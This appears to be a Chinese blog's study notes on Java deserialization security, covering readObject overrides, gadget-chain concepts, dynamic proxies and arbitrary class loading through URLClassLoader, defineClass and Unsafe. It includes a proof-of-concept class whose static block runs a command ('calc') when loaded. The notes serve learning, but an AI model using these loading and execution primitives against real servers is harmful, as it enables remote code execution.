<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>序列化代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">serializeTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span><span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;C:\\Temp\\test.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Person person = <span class="keyword">new</span> Person(<span class="string">&quot;张三&quot;</span>, <span class="number">29</span>);</span><br><span class="line">        serialize(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>反序列化代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">unserializeTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(filename));</span><br><span class="line">        Object o = ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        Person person=(Person)unserialize(<span class="string">&quot;C:\\Temp\\test.bin&quot;</span>);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>transient标记的变量不参与反序列化</strong></p>
<p>Java反序列化的很多操作,是需要开发者深入参与的,所以你会发现大量的库会实现<code>readObject</code>,<code>writeObject</code>方法</p>
<h5 id="objectAnnotation是什么"><a href="#objectAnnotation是什么" class="headerlink" title="objectAnnotation是什么?"></a>objectAnnotation是什么?</h5><p>在执行完默认的 <code>s.defaultWriteObject()</code> 后，向stream里写入了一个字符串 This is a object 。</p>
<p>然后在radObject中调用readObject()方法取出该字符串并打印</p>
<p>其实<code>writeObject</code>和<code>readObject</code>方法默认都支持重写,重写之后就不会执行到try catch了</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220323004013073.png" alt="image-20220323004013073"></p>
<p>它调用的<code>writeObjectOverride</code>方法这样描述</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220323004127574.png" alt="image-20220323004127574"></p>
<p>该方法就是给子类重写默认writeObject方法准备的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    Person(String name, <span class="keyword">int</span> age) &#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span> <span class="keyword">throws</span></span></span><br><span class="line"><span class="function">            IOException </span>&#123;</span><br><span class="line">        s.defaultWriteObject();</span><br><span class="line">        s.writeObject(<span class="string">&quot;This is a object&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        String message = (String) s.readObject();</span><br><span class="line">        System.out.println(message);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Person person = <span class="keyword">new</span> Person(<span class="string">&quot;张三&quot;</span>, <span class="number">19</span>);</span><br><span class="line">        ByteArrayOutputStream buf=<span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objectOutputStream= <span class="keyword">new</span> ObjectOutputStream(buf);</span><br><span class="line">        objectOutputStream.writeObject(person);</span><br><span class="line"></span><br><span class="line">        ObjectInputStream objectInputStream=<span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(buf.toByteArray()));</span><br><span class="line">        person=(Person) objectInputStream.readObject();</span><br><span class="line">        System.out.println(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/serializeDu.png" alt="serializeDu"></p>
<p>可以在objectAnnotation中看到 This is a object</p>
<h5 id="classAnnotations是什么？"><a href="#classAnnotations是什么？" class="headerlink" title="classAnnotations是什么？"></a>classAnnotations是什么？</h5><p><code>ObjectOutputStream</code>类中有一个方法<code>annotateClass</code>方法,<code>ObjectOutputStream</code>的子类需要向序列化后的数据里放任何内容,都可以重写这个方法,写入自己想要写入的数据,然后反序列化的时候就可以读取到这个信息并使用</p>
<p>比如，RMI的 类 <code>MarshalOutputStream</code> 就将当前的 <code>codebase</code> 写入</p>
<p>所以在分析序列化数据的时候看到<code>classAnnotations</code>,实际上就是<code>annotateClass</code>方法写入的内容</p>
<p>有些快递打包和拆包有特殊需求,比如易碎朝上,类比重写writeObject和readObject</p>
<p>使用<code>SerializationDumper</code>需要的是16进制字符串</p>
<h5 id="16进制字符串和byte相互转换"><a href="#16进制字符串和byte相互转换" class="headerlink" title="16进制字符串和byte相互转换"></a>16进制字符串和byte相互转换</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Convert byte[] to hex string.这里我们可以将byte转换成int，然后利用Integer.toHexString(int)来转换成16进制字符串。</span></span><br><span class="line"><span class="comment"> * @param src byte[] data</span></span><br><span class="line"><span class="comment"> * @return hex string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">bytesToHexString</span><span class="params">(<span class="keyword">byte</span>[] src)</span></span>&#123;</span><br><span class="line">    StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (src == <span class="keyword">null</span> || src.length &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; src.length; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> v = src[i] &amp; <span class="number">0xFF</span>;</span><br><span class="line">        String hv = Integer.toHexString(v);</span><br><span class="line">        <span class="keyword">if</span> (hv.length() &lt; <span class="number">2</span>) &#123;</span><br><span class="line">            stringBuilder.append(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        stringBuilder.append(hv);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> stringBuilder.toString();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Convert hex string to byte[]</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> hexString the hex string</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> byte[]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] hexStringToBytes(String hexString) &#123;</span><br><span class="line">    <span class="keyword">if</span> (hexString == <span class="keyword">null</span> || hexString.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    hexString = hexString.toUpperCase();</span><br><span class="line">    <span class="keyword">int</span> length = hexString.length() / <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">char</span>[] hexChars = hexString.toCharArray();</span><br><span class="line">    <span class="keyword">byte</span>[] d = <span class="keyword">new</span> <span class="keyword">byte</span>[length];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> pos = i * <span class="number">2</span>;</span><br><span class="line">        d[i] = (<span class="keyword">byte</span>) (charToByte(hexChars[pos]) &lt;&lt; <span class="number">4</span> | charToByte(hexChars[pos + <span class="number">1</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> d;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<h5 id="为什么会产生安全问题"><a href="#为什么会产生安全问题" class="headerlink" title="为什么会产生安全问题?"></a>为什么会产生安全问题?</h5><p>只要服务器端反序列化数据,客户端传递类的readObject中代码会自动执行,给予攻击者在服务器上运行代码的能力</p>
<p>可能的形式</p>
<p>1.入口类的readObject直接调用危险方法</p>
<p>2.入口类参数中包含可控类,该类有危险方法,readObject时调用</p>
<p>入口A HashMap 接收参数O</p>
<p>3.入口类参数中包含可控类,该类又调用其他有危险方法的类,readObject时调用</p>
<p>4.构造函数/静态代码块等类加载时隐式执行</p>
<p>直接在readObject进行攻击是不现实的,最好包一个类</p>
<p>共同条件    继承Serializeable</p>
<p>入口类 source (重写readObject   参数类型宽泛   最好jdk自带)   </p>
<p>调用链  </p>
<p>反射在序列化中的应用</p>
<p>定制需要的对象</p>
<p>通过invoke调用除了同名函数以外的函数</p>
<p>通过Class类创建对象,引入不能序列化的类</p>
<h3 id="JDK动态代理"><a href="#JDK动态代理" class="headerlink" title="JDK动态代理"></a>JDK动态代理</h3><h4 id="代理模式"><a href="#代理模式" class="headerlink" title="代理模式"></a>代理模式</h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220307121128637.png" alt="image-20220307121128637"></p>
<h5 id="代理模式优点"><a href="#代理模式优点" class="headerlink" title="代理模式优点"></a>代理模式优点</h5><ul>
<li>职责清晰</li>
<li>高扩展，只要实现了接口，都可以用代理。</li>
<li>智能化，动态代理。</li>
</ul>
<h4 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h4><p>个人理解:<strong>静态代理就是两个实现了同一个接口的类,其中一个类当被代理类,另一个类中实现实例化被代理的类,并在其同名方法中增加自己的个性化内容,必须”收中介费”</strong>,代理类也可以有多个,必须二手房产可以有不同的品牌</p>
<p>以知乎上租房子的例子为例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IRentHouse</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">rentHouse</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">--------------------------</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RentHouse</span> <span class="keyword">implements</span> <span class="title">IRentHouse</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">rentHouse</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;租房子&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">---------------------------</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RentHouseProxy</span> <span class="keyword">implements</span> <span class="title">IRentHouse</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> IRentHouse rentHouse;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">RentHouseProxy</span><span class="params">(IRentHouse rentHouse)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.rentHouse = rentHouse;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">rentHouse</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;交中介费&quot;</span>);</span><br><span class="line">        rentHouse.rentHouse();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">--------------------------------</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        RentHouse rentHouse=<span class="keyword">new</span> RentHouse();</span><br><span class="line">        RentHouseProxy rentHouseProxy=<span class="keyword">new</span> RentHouseProxy(rentHouse);</span><br><span class="line"></span><br><span class="line">        rentHouseProxy.rentHouse();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">最后结果是:</span><br><span class="line">交中介费</span><br><span class="line">租房子</span><br></pre></td></tr></table></figure>

<h5 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h5><p>方便实现</p>
<p>但是当目标类增加了,代理类可能也需要成倍的增加,代理类数量过多,接口增加一个方法,所有实现类都需要增加重写方法</p>
<h4 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h4><p><strong>在程序执行过程中,使用jdk的反射机制,创建代理类对象</strong>,并动态的指定要代理目标类,换句话说,动态类是一种创建java对象的能力,帮调用者自动创建对象</p>
<p>动态代理的实现方式常用的有两种:</p>
<ul>
<li>使用jdk代理代理</li>
</ul>
<p>使用java反射包中的类和接口实现动态代理的功能,反射包 java.lang.reflect ,里面有三个类: InvocationHandler,Method,Proxy</p>
<ul>
<li>通过CGLIB动态代理</li>
</ul>
<p>cglib是第三方的工具库,创建代理对象,  cglib的原理是继承,     cglib通过继承目标类,创建它的子类,在子类中重写父类中同名的方法,实现功能的修改</p>
<p>要求目标类和方法不能是final的</p>
<p>动态代理则可以根据传递的方法而自动调用对应方法,类似于<code>反射</code>中的getMethod和invoke结合起来使用了</p>
<p>首先要定义一个InvocationHandler对象并实现InvocationHandler接口</p>
<p>InvocationHandler(调用处理器)接口,就一个方法invoke(),</p>
<p>​        invoke():表示代理对象要执行的功能代码,代理类要完成的功能就写在invoke()方法中</p>
<p>怎么使用?</p>
<ol>
<li>创建类实现接口InvocationHandler</li>
<li>重写invoke()方法,把原来静态代理中代理类要完成的功能,写在这里</li>
</ol>
<p>Method类:表示方法的,确切的说就是目标类中的方法</p>
<p>作用:通过Method可以执行某个目标类的方法 method.invoke(目标对象,方法的参数),这个Invoke和InvocationHandler中的Invoke没有关系</p>
<p>Proxy类 :核心的对象,创建代理对象,之前创建对象都是new 类的构造方法,现在我们是使用Proxy类的方法,代理new的使用</p>
<p>方法:静态方法 newProxyInstance()</p>
<p>作用是:创建代理对象,等同于静态代理中的new RentHouseProxy</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">newProxyInstance</span><span class="params">(ClassLoader loader,</span></span></span><br><span class="line"><span class="params"><span class="function">                                          Class&lt;?&gt;[] interfaces,</span></span></span><br><span class="line"><span class="params"><span class="function">                                          InvocationHandler h)</span></span></span><br></pre></td></tr></table></figure>

<p>参数:</p>
<ol>
<li>ClassLoader  loader类加载器,负责向内存中加载对象的,使用反射获取对象的ClassLoader类</li>
<li>Class&lt;?&gt;[] interfaces: 接口,目标对象实现的接口,也是反射获取的</li>
<li>InvocationHandler h :自己写的代理类要完成的功能</li>
</ol>
<p>返回值:            就是代理对象</p>
<p>实现动态代理的步骤:</p>
<ol>
<li>创建接口,定义目标类要完成的功能</li>
<li>创建目标类实现接口</li>
<li>创建InvocationHandler接口的实现类,在invoke方法中完成代理类的功能<ol>
<li>调用目标方法</li>
<li>增强功能</li>
</ol>
</li>
<li>使用Proxy类的静态方法    创建代理对象,并把返回值转为接口类型</li>
</ol>
<p>为什么能转换成接口类型,因为它代理的类实现了该接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RentHouseInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line">    IRentHouse rentHouse;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">RentHouseInvocationHandler</span><span class="params">(IRentHouse rentHouse)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.rentHouse = rentHouse;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line"></span><br><span class="line">        method.invoke(rentHouse,args);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        RentHouse rentHouse=<span class="keyword">new</span> RentHouse();</span><br><span class="line">        </span><br><span class="line">        RentHouseInvocationHandler rentHouseInvocationHandler = <span class="keyword">new</span> RentHouseInvocationHandler(rentHouse);</span><br><span class="line">        IRentHouse o = (IRentHouse)Proxy.newProxyInstance(rentHouse.getClass().getClassLoader(), rentHouse.getClass().getInterfaces(), rentHouseInvocationHandler);</span><br><span class="line">        o.rentHouse();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p>动态代理在漏洞利用的用法,</p>
<p>如果某个类是动态代理类,里面调用传入类的f方法,那么就可以传入B从而调用B的f方法</p>
<p>readObject-&gt;反序列化自动执行</p>
<p>invoke-&gt;有函数调用</p>
<h4 id="动态类加载方法"><a href="#动态类加载方法" class="headerlink" title="动态类加载方法"></a>动态类加载方法</h4><p>Class.forName    可以设置是否初始化</p>
<p>ClassLoader.loadClass不进行初始化</p>
<p>ClassLoader-&gt;SecureClassLoader-&gt;URLClassLoader-&gt;AppClassLoader</p>
<p>loadClass-&gt;findClass(重写的方法)-&gt;defineClass(从字节码加载类)</p>
<h3 id="任意类加载"><a href="#任意类加载" class="headerlink" title="任意类加载"></a>任意类加载</h3><p>URLClassLoader </p>
<p>ClassLoader.defineClass 字节码加载类</p>
<p>Unsafe.defineClass 字节码加载    :Spring中有一个可以直接生成的方法</p>
<h4 id="URLClassLoader-file-http-jar"><a href="#URLClassLoader-file-http-jar" class="headerlink" title="URLClassLoader : file http  jar"></a>URLClassLoader : file http  jar</h4><p>Test.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="file协议"><a href="#file协议" class="headerlink" title="file协议"></a>file协议</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoadClassTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        URLClassLoader urlClassLoader=<span class="keyword">new</span> URLClassLoader(<span class="keyword">new</span> URL[]&#123;<span class="keyword">new</span> URL(<span class="string">&quot;file:///C:\\Temp\\classes\\&quot;</span>)&#125;);</span><br><span class="line">        Class&lt;?&gt; test = urlClassLoader.loadClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        Object o = test.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="jar协议"><a href="#jar协议" class="headerlink" title="jar协议"></a>jar协议</h5><p>jar协议中可以使用http,file</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">jar -cvf Test.jar .\Test.class   <span class="comment">//先编译成class文件再打包</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoadClassTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        URLClassLoader urlClassLoader=<span class="keyword">new</span> URLClassLoader(<span class="keyword">new</span> URL[]&#123;<span class="keyword">new</span> URL(<span class="string">&quot;jar:file:///C:\\Temp\\classes\\Test.jar!/&quot;</span>)&#125;);</span><br><span class="line">        Class&lt;?&gt; test = urlClassLoader.loadClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        Object o = test.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="DefineClass通过字节码加载类"><a href="#DefineClass通过字节码加载类" class="headerlink" title="DefineClass通过字节码加载类"></a>DefineClass通过字节码加载类</h4><p><strong>defineClass只是将字节码转换为Class,而不会主动加载类,需要再次实例化,才能调用到静态代码块</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Method defineClass = ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="keyword">byte</span>[].class, <span class="keyword">int</span>.class, <span class="keyword">int</span>.class);</span><br><span class="line">        defineClass.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader();</span><br><span class="line">        <span class="keyword">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Temp\\classes\\Test.class&quot;</span>));</span><br><span class="line">        Class o= (Class)defineClass.invoke(systemClassLoader, <span class="string">&quot;Test&quot;</span>, code, <span class="number">0</span>, code.length);</span><br><span class="line">        o.newInstance();</span><br></pre></td></tr></table></figure>

<h4 id="loadClass-findClass-defineClass区别"><a href="#loadClass-findClass-defineClass区别" class="headerlink" title="loadClass,findClass,defineClass区别"></a>loadClass,findClass,defineClass区别</h4><h5 id="loadClass"><a href="#loadClass" class="headerlink" title="loadClass"></a>loadClass</h5><ul>
<li><p>findLoadedClass(String) 调用这个方法，查看这个Class是否已经被加载</p>
</li>
<li><p>如果没有被加载，继续往下走，查看父类加载器，递归调用loadClass()</p>
</li>
<li><p>如果父类加载器是null，说明是启动类加载器，查找对应的Class</p>
</li>
<li><p>如果都没有找到，就调用findClass(String)</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="keyword">boolean</span> resolve)</span><br><span class="line">    <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">synchronized</span> (getClassLoadingLock(name)) &#123;</span><br><span class="line">        <span class="comment">// First, check if the class has already been loaded</span></span><br><span class="line">        Class&lt;?&gt; c = findLoadedClass(name);</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">long</span> t0 = System.nanoTime();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (parent != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    c = parent.loadClass(name, <span class="keyword">false</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    c = findBootstrapClassOrNull(name);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                <span class="comment">// ClassNotFoundException thrown if class not found</span></span><br><span class="line">                <span class="comment">// from the non-null parent class loader</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (c == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">// If still not found, then invoke findClass in order</span></span><br><span class="line">                <span class="comment">// to find the class.</span></span><br><span class="line">                <span class="keyword">long</span> t1 = System.nanoTime();</span><br><span class="line">                c = findClass(name);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// this is the defining class loader; record the stats</span></span><br><span class="line">                sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);</span><br><span class="line">                sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);</span><br><span class="line">                sun.misc.PerfCounter.getFindClasses().increment();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (resolve) &#123;</span><br><span class="line">            resolveClass(c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="findClass"><a href="#findClass" class="headerlink" title="findClass()"></a>findClass()</h5><ul>
<li>根据名称或位置加载.class字节码,然后使用defineClass</li>
<li>通常由子类去实现</li>
</ul>
<h5 id="defineClass"><a href="#defineClass" class="headerlink" title="defineClass()"></a>defineClass()</h5><ul>
<li>把字节码转化为Class</li>
</ul>
<h4 id="Unsafe"><a href="#Unsafe" class="headerlink" title="Unsafe"></a>Unsafe</h4><p>Unsafe类采用了单例模式设计,但是它其中也有defineClass方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;Unsafe&gt; unsafeClass = Unsafe.class;</span><br><span class="line">        Field theUnsafe = unsafeClass.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Temp\\classes\\Test.class&quot;</span>));</span><br><span class="line">        ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader();</span><br><span class="line">        theUnsafe.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Unsafe unsafe=(Unsafe) theUnsafe.get(<span class="keyword">null</span>);</span><br><span class="line">        Class test=(Class) unsafe.defineClass(<span class="string">&quot;Test&quot;</span>,code,<span class="number">0</span>,code.length,systemClassLoader,<span class="keyword">null</span>);</span><br><span class="line">        test.newInstance();</span><br></pre></td></tr></table></figure>

















]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>java多线程</title>
    <url>/2021/12/23/java%E5%A4%9A%E7%BA%BF%E7%A8%8B/</url>
